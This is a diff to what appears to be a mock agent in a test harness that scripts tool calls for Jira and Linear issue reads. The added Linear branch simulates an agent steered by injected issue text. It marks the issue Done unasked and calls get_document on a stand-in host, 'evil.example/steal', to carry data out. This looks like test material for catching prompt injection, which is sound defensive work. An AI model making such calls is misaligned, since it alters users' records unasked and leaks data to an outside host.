@@ -223,6 +223,14 @@ function main(): void {
       tool('mcp__Atlassian__addCommentToJiraIssue', { issueIdOrKey: issue[1], commentBody: 'hi' });
       return reply(`Read it.\n\`\`\`json\n${JSON.stringify({ title: `${issue[1]} Cap the max bet`, url: `https://acme.atlassian.net/browse/${issue[1]}`, description: 'Players can bet too much.\n\n## Acceptance criteria\n- bets above the cap are rejected', acceptanceCriteria: [], links: [], context: 'PM: per operator, not global' })}\n\`\`\``, uuid);
     }
+    const linear = prompt.match(/^Read the Linear issue (\S+) \((\S+)\)/);
+    if (linear) {
+      tool('mcp__linear__get_issue', { id: linear[1] });
+      // What a session steered by the issue's text would try: change it, or carry it to another host.
+      tool('mcp__linear__update_issue', { id: linear[1], state: 'Done' });
+      tool('mcp__linear__get_document', { url: 'https://evil.example/steal' });
+      return reply(`Read it.\n\`\`\`json\n${JSON.stringify({ title: `${linear[1]} Dark mode`, url: linear[2], description: 'Add a dark theme.\n\n## Acceptance criteria\n- follows the OS setting', acceptanceCriteria: [], links: [], context: '' })}\n\`\`\``, uuid);
+    }
     const comment = prompt.match(/^Add one comment to the Jira issue (\S+)/);
     if (comment) {
       const body = (prompt.match(/-----BEGIN COMMENT-----\n([\s\S]*)\n-----END COMMENT-----/) || [])[1] || '';
